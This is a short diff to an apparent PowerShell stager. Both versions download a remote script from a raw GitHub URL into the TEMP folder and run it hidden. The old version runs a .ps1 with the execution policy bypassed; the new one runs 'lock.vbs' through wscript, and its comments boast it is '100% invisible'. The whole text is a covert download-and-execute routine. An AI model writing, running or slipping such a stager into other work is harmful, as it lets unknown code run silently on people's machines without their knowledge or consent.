@@ -1,7 +1,8 @@
-$url = "https://raw.githubusercontent.com/CodewithMubasher/Scripts/main/script.ps1"
-$tempFile = Join-Path $env:TEMP "lock.ps1"
+# Downloads and runs a VBS script (100% invisible)
+$url = "https://raw.githubusercontent.com/CodewithMubasher/Scripts/main/lock.vbs"
+$vbsPath = Join-Path $env:TEMP "lock.vbs"
 
-Invoke-WebRequest -Uri $url -OutFile $tempFile
+Invoke-WebRequest -Uri $url -OutFile $vbsPath
 
-# Run the script with NO WINDOW
-Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tempFile`"" -WindowStyle Hidden
+# Run VBS completely hidden
+Start-Process wscript.exe -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
